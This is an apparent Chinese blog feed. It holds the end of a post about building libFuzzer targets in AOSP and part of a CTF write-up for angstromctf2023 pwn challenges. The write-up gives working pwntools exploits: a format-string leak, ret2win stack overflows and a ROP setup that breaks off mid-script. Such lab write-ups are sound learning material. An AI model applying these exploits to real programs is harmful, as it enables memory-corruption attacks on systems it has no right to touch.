files found in ./corpus/ INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytes INFO: A corpus is not provided, starting from an empty corpus #2 INITED cov: 809 ft: 792 corp: 1/1b exec/s: 0 rss: 67Mb NEW_FUNC[1/19]: 0x7c1515b130 (/data/fuzz/arm64/lib/libdatasource.so+0xc130) (BuildId: e0f84a9199bae756b2cabb11bc30efe4) ...... 探索3：adb sync ztree@ubuntu2:~/aosp/android-13.0.0_r7$ adb --help Android Debug Bridge version 1.0.41 Version 34.0.1-9680074 Installed as /home/ztree/Android/Sdk/platform-tools/adb ...... file transfer: ...... sync [-l] [-z ALGORITHM] [-Z] [all|data|odm|oem|product|system|system_ext|vendor] sync a local build from $ANDROID_PRODUCT_OUT to the device (default all) -n: dry run: push files to device without storing to the filesystem -l: list files that would be copied, but don't copy them -z: enable compression with a specified algorithm (any/none/brotli/lz4/zstd) -Z: disable compression # 该环境变量前面也看过了，是在执行. build/envsetup.sh和lunch命令时设置好的 ztree@ubuntu2:~/aosp/android-13.0.0_r7$ echo $ANDROID_PRODUCT_OUT /home/ztree/aosp/android-13.0.0_r7/out/target/product/flame 4 尝试编译host版本的libfuzzer # 在Android.bp中加上支持host的编译选项 ztree@ubuntu2:~/aosp/android-13.0.0_r7$ vim frameworks/av/media/libmediaplayerservice/fuzzer/Android.bp cc_fuzz { name: &quot;metadataretriever_fuzzer&quot;, host_supported: true, // 加上这一行 srcs: [ &quot;metadataretriever_fuzzer.cpp&quot;, ], defaults: [ &quot;libmediaplayerserviceFuzzer_defaults&quot;, ], static_libs: [ &quot;libplayerservice_datasource&quot;, ], shared_libs: [ &quot;libdatasource&quot;, &quot;libdrmframework&quot;, ], } # 编译 ztree@ubuntu2:~/aosp/android-13.0.0_r7$ SANITIZE_HOST=address m metadataretriever_fuzzer 报错如下，也就是依赖的库文件没有x86-64的版本： error: frameworks/av/media/libmediaplayerservice/fuzzer/Android.bp:77:1: dependency &quot;libmediaplayerservice&quot; of &quot;metadataretriever_fuzzer&quot; missing variant: os:linux_glibc,arch:x86_64,link:static available variants: os:android,image:,arch:arm64_armv8-a (alias to os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm64_armv8-a,sdk: (alias to os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm64_armv8-a,sdk:,link:static os:android,image:,arch:arm64_armv8-a,sdk:,link:shared (alias to os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version: os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version:latest (alias to os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm_armv8-a (alias to os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm_armv8-a,sdk: (alias to os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm_armv8-a,sdk:,link:static os:android,image:,arch:arm_armv8-a,sdk:,link:shared (alias to os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version: os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version:latest (alias to os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version:) error: frameworks/av/media/libmediaplayerservice/fuzzer/Android.bp:77:1: dependency &quot;libplayerservice_datasource&quot; of &quot;metadataretriever_fuzzer&quot; missing variant: os:linux_glibc,arch:x86_64,link:static available variants: os:android,image:,arch:arm64_armv8-a (alias to os:android,image:,arch:arm64_armv8-a,sdk:,link:static) os:android,image:,arch:arm64_armv8-a,sdk: (alias to os:android,image:,arch:arm64_armv8-a,sdk:,link:static) os:android,image:,arch:arm64_armv8-a,sdk:,link:static os:android,image:,arch:arm_armv8-a (alias to os:android,image:,arch:arm_armv8-a,sdk:,link:static) os:android,image:,arch:arm_armv8-a,sdk: (alias to os:android,image:,arch:arm_armv8-a,sdk:,link:static) os:android,image:,arch:arm_armv8-a,sdk:,link:static error: frameworks/av/media/libmediaplayerservice/fuzzer/Android.bp:77:1: dependency &quot;libmedia&quot; of &quot;metadataretriever_fuzzer&quot; missing variant: os:linux_glibc,arch:x86_64,link:shared available variants: os:android,image:,arch:arm64_armv8-a (alias to os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm64_armv8-a,sdk: (alias to os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm64_armv8-a,sdk:,link:static os:android,image:,arch:arm64_armv8-a,sdk:,link:shared (alias to os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version: os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version:latest (alias to os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm_armv8-a (alias to os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm_armv8-a,sdk: (alias to os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm_armv8-a,sdk:,link:static os:android,image:,arch:arm_armv8-a,sdk:,link:shared (alias to os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version: os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version:latest (alias to os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version:) error: frameworks/av/media/libmediaplayerservice/fuzzer/Android.bp:77:1: dependency &quot;libstagefright&quot; of &quot;metadataretriever_fuzzer&quot; missing variant: os:linux_glibc,arch:x86_64,link:shared available variants: os:android,image:,arch:arm64_armv8-a (alias to os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm64_armv8-a,sdk: (alias to os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm64_armv8-a,sdk:,link:static os:android,image:,arch:arm64_armv8-a,sdk:,link:shared (alias to os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version: os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version:latest (alias to os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm_armv8-a (alias to os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm_armv8-a,sdk: (alias to os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm_armv8-a,sdk:,link:static os:android,image:,arch:arm_armv8-a,sdk:,link:shared (alias to os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version: os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version:latest (alias to os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version:) error: frameworks/av/media/libmediaplayerservice/fuzzer/Android.bp:77:1: dependency &quot;libdatasource&quot; of &quot;metadataretriever_fuzzer&quot; missing variant: os:linux_glibc,arch:x86_64,link:shared available variants: os:android,image:,arch:arm64_armv8-a (alias to os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm64_armv8-a,sdk: (alias to os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm64_armv8-a,sdk:,link:static os:android,image:,arch:arm64_armv8-a,sdk:,link:shared (alias to os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version: os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version:latest (alias to os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm_armv8-a (alias to os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm_armv8-a,sdk: (alias to os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm_armv8-a,sdk:,link:static os:android,image:,arch:arm_armv8-a,sdk:,link:shared (alias to os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version: os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version:latest (alias to os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version:) error: frameworks/av/media/libmediaplayerservice/fuzzer/Android.bp:77:1: dependency &quot;libdrmframework&quot; of &quot;metadataretriever_fuzzer&quot; missing variant: os:linux_glibc,arch:x86_64,link:shared available variants: os:android,image:,arch:arm64_armv8-a (alias to os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm64_armv8-a,sdk: (alias to os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm64_armv8-a,sdk:,link:shared (alias to os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version: os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version:latest (alias to os:android,image:,arch:arm64_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm_armv8-a (alias to os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm_armv8-a,sdk: (alias to os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm_armv8-a,sdk:,link:shared (alias to os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version:) os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version: os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version:latest (alias to os:android,image:,arch:arm_armv8-a,sdk:,link:shared,version:) 20:11:52 soong bootstrap failed with: exit status 1 #### failed to build some targets (14 seconds) #### 那重新执行一下lunch命令，选择x86-64版本会咋样？ # 目标设备选择x64版本的 ztree@ubuntu2:~/aosp/android-13.0.0_r7$ lunch aosp_x86_64-eng ============================================ PLATFORM_VERSION_CODENAME=REL PLATFORM_VERSION=13 TARGET_PRODUCT=aosp_x86_64 TARGET_BUILD_VARIANT=eng TARGET_BUILD_TYPE=release TARGET_ARCH=x86_64 TARGET_ARCH_VARIANT=x86_64 TARGET_2ND_ARCH=x86 TARGET_2ND_ARCH_VARIANT=x86_64 HOST_ARCH=x86_64 HOST_2ND_ARCH=x86 HOST_OS=linux HOST_OS_EXTRA=Linux-5.19.0-46-generic-x86_64-Ubuntu-22.04.2-LTS HOST_CROSS_OS=windows HOST_CROSS_ARCH=x86 HOST_CROSS_2ND_ARCH=x86_64 HOST_BUILD_TYPE=release BUILD_ID=TP1A.221005.002 OUT_DIR=out PRODUCT_SOONG_NAMESPACES=device/generic/goldfish device/generic/goldfish-opengl hardware/google/camera hardware/google/camera/devices/EmulatedCamera # 重新编译 ztree@ubuntu2:~/aosp/android-13.0.0_r7$ SANITIZE_HOST=address m metadataretriever_fuzzer ...... error: frameworks/av/media/libmediaplayerservice/fuzzer/Android.bp:77:1: dependency &quot;libdrmframework&quot; of &quot;metadataretriever_fuzzer&quot; missing variant: os:linux_glibc,arch:x86_64,link:shared available variants: os:android,image:,arch:x86_64 (alias to os:android,image:,arch:x86_64,sdk:,link:shared,version:) os:android,image:,arch:x86_64,sdk: (alias to os:android,image:,arch:x86_64,sdk:,link:shared,version:) os:android,image:,arch:x86_64,sdk:,link:shared (alias to os:android,image:,arch:x86_64,sdk:,link:shared,version:) os:android,image:,arch:x86_64,sdk:,link:shared,version: os:android,image:,arch:x86_64,sdk:,link:shared,version:latest (alias to os:android,image:,arch:x86_64,sdk:,link:shared,version:) os:android,image:,arch:x86_x86_64 (alias to os:android,image:,arch:x86_x86_64,sdk:,link:shared,version:) os:android,image:,arch:x86_x86_64,sdk: (alias to os:android,image:,arch:x86_x86_64,sdk:,link:shared,version:) os:android,image:,arch:x86_x86_64,sdk:,link:shared (alias to os:android,image:,arch:x86_x86_64,sdk:,link:shared,version:) os:android,image:,arch:x86_x86_64,sdk:,link:shared,version: os:android,image:,arch:x86_x86_64,sdk:,link:shared,version:latest (alias to os:android,image:,arch:x86_x86_64,sdk:,link:shared,version:) 20:18:15 soong bootstrap failed with: exit status 1 #### failed to build some targets (13 seconds) #### 还是不行，可以看到目标依赖是os:linux_glibc，而可用的依赖版本是os:android。暂时不知道哪些模块是可以host上运行libfuzzer，以后遇上再补充吧。 ","link":"https://lzxzl.github.io/post/aosp-shang-de-libfuzzer-chang-shi/"},{"title":"angstromctf2023 - pwn","content":" 因为某原因，最近要看看ctf。 angstromctf2023早在4月就结束了。今天打开一看，诶，还能访问。那就下载下来做一做。 另外，搜到了一个youtube视频专门讲这个比赛的wp，下面的记录，以及pwn环境（docker）很多参考了这个视频。毕竟菜。 1 queue I just learned about stacks and queues in DSA! 1.1 运行 # 开启了canary ❯ make checksec docker run -it --rm -v &quot;`pwd`:/chal&quot; ubuntu-demo checksec --file=queue RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE Full RELRO Canary found NX enabled PIE enabled No RPATH No RUNPATH 46) Symbols No 0 2 queue root@43fe6eff178b:/chal# ./queue Error: missing flag.txt. root@43fe6eff178b:/chal# echo &quot;flag{aaaaaaaaaa}&quot; &gt;&gt; flag.txt root@43fe6eff178b:/chal# ./queue What did you learn in class today? math Oh nice, math sounds pretty cool!root@43fe6eff178b:/chal# 1.2 反编译 int __cdecl main(int argc, const char **argv, const char **envp) { __gid_t rgid; // [rsp+4h] [rbp-CCh] FILE *stream; // [rsp+8h] [rbp-C8h] char format[48]; // [rsp+10h] [rbp-C0h] BYREF char s[136]; // [rsp+40h] [rbp-90h] BYREF unsigned __int64 v9; // [rsp+C8h] [rbp-8h] v9 = __readfsqword(0x28u); setbuf(_bss_start, 0LL); rgid = getegid(); setresgid(rgid, rgid, rgid); stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;); // 打开flag.txt if ( !stream ) { puts(&quot;Error: missing flag.txt.&quot;); // 检查flag.txt是否存在 exit(1); } fgets(s, 128, stream); // 从flag.txt读取内容，存在s里 printf(&quot;What did you learn in class today? &quot;); fgets(format, 48, stdin); // 从stdin读取内容，存在format里 printf(&quot;Oh nice, &quot;); printf(format); // 明显的格式化字符串漏洞 printf(&quot;sounds pretty cool!&quot;); return v9 - __readfsqword(0x28u); } 1.3 调试 太久没做pwn题了，来看一眼。 调试的时候输入：AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p pwndbg&gt; 0x00005604ada7735b in main () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA ────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────────────── *RAX 0x0 RBX 0x0 RCX 0x7f2d801efa37 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */ RDX 0x0 RDI 0x7fff78b48960 ◂— 'AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p' RSI 0x7fff78b46830 ◂— 'Oh nice, you learn in class today? ' R8 0x9 R9 0x5604aec8d490 ◂— 'AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\\n' R10 0x5604ada78054 ◂— 'Oh nice, ' R11 0x246 R12 0x7fff78b48b38 —▸ 0x7fff78b4a8dd ◂— '/chal/queue' R13 0x5604ada77249 (main) ◂— endbr64 R14 0x5604ada79d80 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5604ada77200 (__do_global_dtors_aux) ◂— endbr64 R15 0x7f2d80344040 (_rtld_global) —▸ 0x7f2d803452e0 —▸ 0x5604ada76000 ◂— 0x10102464c457f RBP 0x7fff78b48a20 ◂— 0x1 RSP 0x7fff78b48950 ◂— 0x0 *RIP 0x5604ada7735b (main+274) ◂— call 0x5604ada77110 ─────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────────── 0x5604ada77342 &lt;main+249&gt; mov eax, 0 0x5604ada77347 &lt;main+254&gt; call printf@plt &lt;printf@plt&gt; 0x5604ada7734c &lt;main+259&gt; lea rax, [rbp - 0xc0] 0x5604ada77353 &lt;main+266&gt; mov rdi, rax 0x5604ada77356 &lt;main+269&gt; mov eax, 0 ► 0x5604ada7735b &lt;main+274&gt; call printf@plt &lt;printf@plt&gt; format: 0x7fff78b48960 ◂— 'AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p' vararg: 0x7fff78b46830 ◂— 'Oh nice, you learn in class today? ' 0x5604ada77360 &lt;main+279&gt; lea rax, [rip + 0xcf7] 0x5604ada77367 &lt;main+286&gt; mov rdi, rax 0x5604ada7736a &lt;main+289&gt; mov eax, 0 0x5604ada7736f &lt;main+294&gt; call printf@plt &lt;printf@plt&gt; 0x5604ada77374 &lt;main+299&gt; nop ──────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────────────────────── 00:0000│ rsp 0x7fff78b48950 ◂— 0x0 01:0008│ 0x7fff78b48958 —▸ 0x5604aec8c2a0 ◂— 0xfbad2488 02:0010│ rdi 0x7fff78b48960 ◂— 'AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p' 03:0018│ 0x7fff78b48968 ◂— '.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p' 04:0020│ 0x7fff78b48970 ◂— 'p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p' 05:0028│ 0x7fff78b48978 ◂— '%p.%p.%p.%p.%p.%p.%p.%p' 06:0030│ 0x7fff78b48980 ◂— '.%p.%p.%p.%p.%p' 07:0038│ 0x7fff78b48988 ◂— 0x70252e70252e70 /* 'p.%p.%p' */ ────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────────────────────── ► 0 0x5604ada7735b main+274 1 0x7f2d80104d90 __libc_start_call_main+128 2 0x7f2d80104e40 __libc_start_main+128 3 0x5604ada77185 _start+37 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg&gt; x/20gx $rsp 0x7fff78b48950: 0x0000000000000000 0x00005604aec8c2a0 0x7fff78b48960: 0x4141414141414141 0x252e70252e70252e 0x7fff78b48970: 0x2e70252e70252e70 0x70252e70252e7025 0x7fff78b48980: 0x252e70252e70252e 0x0070252e70252e70 0x7fff78b48990: 0x6161617b67616c66 0x000a7d6161616161 0x7fff78b489a0: 0x0000000000000000 0x0000000000000000 0x7fff78b489b0: 0x0000000000000000 0x0000000000000000 0x7fff78b489c0: 0x0000000000000000 0x0000000000000000 0x7fff78b489d0: 0x0000000000000000 0x0000000000000000 0x7fff78b489e0: 0x0000000000000000 0x0000000000000000 pwndbg&gt; c Continuing. AAAAAAAA.0x7fff78b46830.(nil).0x7f2d801efa37.0x9.0x5604aec8d490.(nil).0x5604aec8c2a0.0x4141414141414141.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x70252e70252e70sounds pretty cool![Inferior 1 (process 51) exited normally] 看一下打印结果： rdi .rsi[1] .rdx[2].rcx[3] .r8[4].r9[5] AAAAAAAA.0x7fff78b46830.(nil).0x7f2d801efa37.0x9.0x5604aec8d490.(nil).0x5604aec8c2a0.0x4141414141414141.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x70252e70252e70 栈里数一下： pwndbg&gt; x/20gx $rsp 0x7fff78b48950: 0x0000000000000000 0x00005604aec8c2a0 [6.7] 0x7fff78b48960: 0x4141414141414141 0x252e70252e70252e [8.9] 0x7fff78b48970: 0x2e70252e70252e70 0x70252e70252e7025 [10.11] 0x7fff78b48980: 0x252e70252e70252e 0x0070252e70252e70 [12.13] 0x7fff78b48990: 0x6161617b67616c66 0x000a7d6161616161 [14.15] 0x7fff78b489a0: 0x0000000000000000 0x0000000000000000 0x7fff78b489b0: 0x0000000000000000 0x0000000000000000 0x7fff78b489c0: 0x0000000000000000 0x0000000000000000 0x7fff78b489d0: 0x0000000000000000 0x0000000000000000 0x7fff78b489e0: 0x0000000000000000 0x0000000000000000 验证一下： root@43fe6eff178b:/chal# ./queue What did you learn in class today? %15$p Oh nice, 0xa7d6161616161 sounds pretty cool!root@43fe6eff178b:/chal# 1.4 exp from pwn import * import warnings warnings.filterwarnings(action='ignore', category=BytesWarning) s = lambda data :p.send(data) sa = lambda delim,data :p.sendafter(delim, data) sl = lambda data :p.sendline(data) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num=4096 :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) ruf = lambda delims, drop=False :p.recvuntil(delims, drop) uu64 = lambda data :u64(data.ljust(8,'\\x00')) leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr)) logsucc = lambda info :log.success(info) itr = lambda :p.interactive() context.log_level = 'DEBUG' #context.terminal=['tmux', 'spilit-window', '-h'] context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P'] flag = &quot;&quot; # 因为我写的flag是16字节，所以这里范围选择[14,16)。根据实际情况更改 for i in range(14,16): p = process(&quot;./queue&quot;) myformat = &quot;%{j}$p&quot;.format(j=i) logsucc(myformat) sla(b'today? ', myformat.encode()) ru(b'Oh nice, 0x') data = ru(b'\\nsounds', drop=True) flag += bytes.fromhex(data.decode()).decode()[::-1] logsucc(flag) p.close() logsucc(flag) root@9aea9b3d9446:/chal# python3 exp.py [+] Starting local process './queue' argv=[b'./queue'] : pid 87 [+] %14$p [DEBUG] Received 0x23 bytes: b'What did you learn in class today? ' [DEBUG] Sent 0x6 bytes: b'%14$p\\n' [DEBUG] Received 0x2f bytes: b'Oh nice, 0x6161617b67616c66\\n' b'sounds pretty cool!' [+] flag{aaa [*] Process './queue' stopped with exit code 0 (pid 87) [+] Starting local process './queue' argv=[b'./queue'] : pid 89 [+] %15$p [DEBUG] Received 0x23 bytes: b'What did you learn in class today? ' [DEBUG] Sent 0x6 bytes: b'%15$p\\n' [DEBUG] Received 0x2f bytes: b'Oh nice, 0x7d61616161616161\\n' b'sounds pretty cool!' [+] flag{aaaaaaaaaa} [*] Process './queue' stopped with exit code 0 (pid 89) [+] flag{aaaaaaaaaa} 2 gaga Multipart challenge! Note all use essentially the same Dockerfile. The flags are split among all three challenges. If you are already a pwn expert, the last challenge has the entire flag. 2.1 运行 先看一眼Dockerfile，仍然需要flag.txt FROM pwn.red/jail COPY --from=ubuntu:20.04 / /srv COPY gaga2 /srv/app/run COPY flag.txt /srv/app/flag.txt RUN chmod 755 /srv/app/run root@870aeb6e392e:/chal# ls Dockerfile Makefile gaga0 gaga1 gaga2 root@870aeb6e392e:/chal# echo &quot;flag{aaaaaaaaaa}&quot; &gt;&gt; flag.txt root@870aeb6e392e:/chal# ./gaga0 Welcome to gaga! This challenge is meant to guide you through an introduction to binary exploitation. Right now, you are on stage0. Your goal is to redirect program control to win0, which is at address 0x401236. Your input: aaa root@870aeb6e392e:/chal# ./gaga1 Nice! Now you need to call the win1 function with the correct arguments. Your input: aaa root@870aeb6e392e:/chal# ./gaga2 Awesome! Now there's no system(), so what will you do?! Your input: aaa # Canary、PIE关了，NX开了 root@870aeb6e392e:/chal# checksec --file=gaga0 [*] '/chal/gaga0' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 2.2 反编译&amp;分析 gaga0 int __cdecl main(int argc, const char **argv, const char **envp) { char v4[60]; // [rsp+0h] [rbp-40h] BYREF 距离rbp有0x40的长度 __gid_t rgid; // [rsp+3Ch] [rbp-4h] setbuf(_bss_start, 0LL); rgid = getegid(); setresgid(rgid, rgid, rgid); puts(&quot;Welcome to gaga!&quot;); puts(&quot;This challenge is meant to guide you through an introduction to binary exploitation.&quot;); printf( &quot;\\nRight now, you are on stage0. Your goal is to redirect program control to win0, which is at address %p.\\n&quot;, win0); printf(&quot;Your input: &quot;); return gets(v4); // return 输入？ } 根据打印提示，看看win0函数。如下，直接打印flag： int win0() { char s[136]; // [rsp+0h] [rbp-90h] BYREF FILE *stream; // [rsp+88h] [rbp-8h] stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;); if ( !stream ) { puts(&quot;Error: missing flag.txt.&quot;); exit(1); } fgets(s, 128, stream); return puts(s); } 那就简单了，Canary啥的都关了，最简单的ret2text。就不调试了，根据IDA的注释，偏移等于0x40+0x8=0x48，先用这个写exp，有问题再说。 exp from pwn import * import warnings warnings.filterwarnings(action='ignore', category=BytesWarning) s = lambda data :p.send(data) sa = lambda delim,data :p.sendafter(delim, data) sl = lambda data :p.sendline(data) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num=4096 :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) ruf = lambda delims, drop=False :p.recvuntil(delims, drop) uu64 = lambda data :u64(data.ljust(8,'\\x00')) leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr)) logsucc = lambda info :log.success(info) itr = lambda :p.interactive() context.log_level = 'DEBUG' #context.terminal=['tmux', 'spilit-window', '-h'] context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P'] elf = ELF(&quot;./gaga0&quot;) p = process(&quot;./gaga0&quot;) logsucc(hex(elf.symbols['win0'])) payload = b'a'*0x48+ p64(elf.symbols['win0']) sla(&quot;Your input: &quot;, payload) itr() gaga1 int __cdecl main(int argc, const char **argv, const char **envp) { char v4[60]; // [rsp+0h] [rbp-40h] BYREF __gid_t rgid; // [rsp+3Ch] [rbp-4h] setbuf(_bss_start, 0LL); rgid = getegid(); setresgid(rgid, rgid, rgid); puts(&quot;Nice!&quot;); puts(&quot;Now you need to call the win1 function with the correct arguments.&quot;); printf(&quot;Your input: &quot;); return gets(v4); } void __fastcall win1(int a1, int a2) { char s[136]; // [rsp+10h] [rbp-90h] BYREF FILE *stream; // [rsp+98h] [rbp-8h] if ( a1 == 4919 || a2 == 16705 ) { stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;); if ( !stream ) { puts(&quot;Error: missing flag.txt.&quot;); exit(1); } fgets(s, 128, stream); puts(s); } } 和gaga0基本一样，只不过在外面加了个if(a1 == 4919 || a2 == 16705)。简单，直接把main的ret覆盖成if判断后的地址0x401269： .text:000000000040125D cmp [rbp+var_98], 4141h .text:0000000000401267 jnz short loc_4012C6 .text:0000000000401269 .text:0000000000401269 loc_401269: ; CODE XREF: win1+25↑j .text:0000000000401269 lea rsi, modes ; &quot;r&quot; .text:0000000000401270 lea rdi, filename ; &quot;flag.txt&quot; .text:0000000000401277 call _fopen exp修改如下： p = process(&quot;./gaga1&quot;) #gdb.attach(p, gdbscript='b main') payload = b'a'*0x48 + p64(0x401269) sla(&quot;Your input: &quot;, payload) itr() 然后执行后失败了，gdb调试，找到问题所在。如下图，前面覆盖ret的时候没关注rbp，直接覆盖成aaaaaaaa。而在这里会用到rbp，非法地址导致crash： 解决办法就是将rbp覆盖成一个可读可写的地址。gdb调一下，在可读可写的地址里随便选一个，比如0x404100 pwndbg&gt; vmmap LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA Start End Perm Size Offset File 0x400000 0x401000 r--p 1000 0 /chal/gaga1 0x401000 0x402000 r-xp 1000 1000 /chal/gaga1 0x402000 0x403000 r--p 1000 2000 /chal/gaga1 0x403000 0x404000 r--p 1000 2000 /chal/gaga1 0x404000 0x405000 rw-p 1000 3000 /chal/gaga1 &lt;---这一行选个地址 0x7fd81cbc9000 0x7fd81cbcc000 rw-p 3000 0 [anon_7fd81cbc9] 0x7fd81cbcc000 0x7fd81cbf4000 r--p 28000 0 /usr/lib/x86_64-linux-gnu/libc.so.6 最终的exp如下： p = process(&quot;./gaga1&quot;) payload = b'a'*0x40 + p64(0x404400) + p64(0x401269) sla(&quot;Your input: &quot;, payload) itr() gaga2 int __cdecl main(int argc, const char **argv, const char **envp) { char v4[60]; // [rsp+0h] [rbp-40h] BYREF __gid_t rgid; // [rsp+3Ch] [rbp-4h] setbuf(_bss_start, 0LL); rgid = getegid(); setresgid(rgid, rgid, rgid); puts(&quot;Awesome! Now there's no system(), so what will you do?!&quot;); printf(&quot;Your input: &quot;); return gets(v4); } 这次没有“后门函数”了，查看一下保护机制： root@e289eaa0da06:/chal# checksec gaga2 [*] '/chal/gaga2' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 关了PIE，开了NX，不能ret2shellcode，那就rop吧。以前一直用ROPGadget/one_gadget这些工具，这次试试pwntools里的rop模块。要说的都在注释里了，看代码吧： from pwn import * import warnings warnings.filterwarnings(action='ignore', category=BytesWarning) s = lambda data :p.send(data) sa = lambda delim,data :p.sendafter(delim, data) sl = lambda data :p.sendline(data) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num=4096 :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) ruf = lambda delims, drop=False :p.recvuntil(delims, drop) rl = lambda drop=True :p.recvline(drop) rlf = lambda drop=False :p.recvline(drop) uu64 = lambda data :u64(data.ljust(8,'\\x00')) leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr)) logsucc = lambda info :log.success(info) itr = lambda :p.interactive() context.clear(arch='amd64') # 【注意1】加上架构信息，不然rop模块会把该程序当成32位程序 context.log_level = 'DEBUG' #context.terminal=['tmux', 'spilit-window', '-h'] context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', 